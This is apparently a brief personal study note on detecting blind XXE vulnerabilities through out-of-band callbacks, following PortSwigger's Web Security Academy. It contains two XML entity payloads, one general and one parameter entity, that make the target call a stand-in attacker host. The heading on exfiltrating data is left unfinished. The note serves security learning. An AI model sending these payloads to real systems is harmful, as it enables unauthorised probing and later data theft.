# Detecting blind [[XXE]] using out-of-band (OAST) techniques

Use HTTP request:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://bupr-collaborator.web-attacker.com"> ]>
```
Monitor if there any DNS or HTTP requests to your URL.

If entities are blocked, due to input validation, you might be able to use XML parameter entities instead which can be referenced within DTO only.
**Declaration example**:
```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```
**Usage**:
```
%myparameterentity;
```
**Example**:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

# Exploiting blind XXE to exfiltrate data out-of-band

#to-be-continued
https://portswigger.net/web-security/xxe/blind
